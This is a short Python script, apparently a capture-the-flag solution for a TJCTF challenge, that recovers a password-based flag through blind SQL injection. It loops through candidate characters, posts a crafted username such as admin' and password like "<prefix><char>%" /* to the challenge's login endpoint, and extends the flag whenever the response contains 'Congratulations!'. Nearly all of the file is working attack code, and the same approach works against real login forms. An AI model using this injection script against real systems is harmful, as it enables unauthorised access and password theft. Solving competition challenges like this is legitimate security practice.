import requests
import string

chars = string.lowercase + string.digits + '\\!\\@\\#\\$\\%\\^\\&\\*\\(\\)\\_\\+\\-\\=\\{\\}\\;\\,\\.\\/\\<\\>\\?'
flag = 'blinded'
while True:
    bf = len(flag)
    ch = ''
    idx = 0
    while idx < len(chars):
        if chars[idx] == '\\':
            ch = chars[idx] + chars[idx+1]
            idx += 2
        else:
            ch = chars[idx]
            idx += 1
        payload = 'admin\' and password like "'+ flag + ch + '%" /*'
        print payload
        res = requests.post('https://weak_password.tjctf.org/login', data = {'username': payload, 'password' : 'test'})
        if res.text.find('Congratulations!') != -1:
            print 'Found flag!!'
            print 'char: ' + ch
            flag += ch
            print 'flag: ' + flag
            break
    af = len(flag)
    if bf == af:
        print 'The work is done'
        break
print 'Complete flags is : tjctf{' + flag + '}'

            
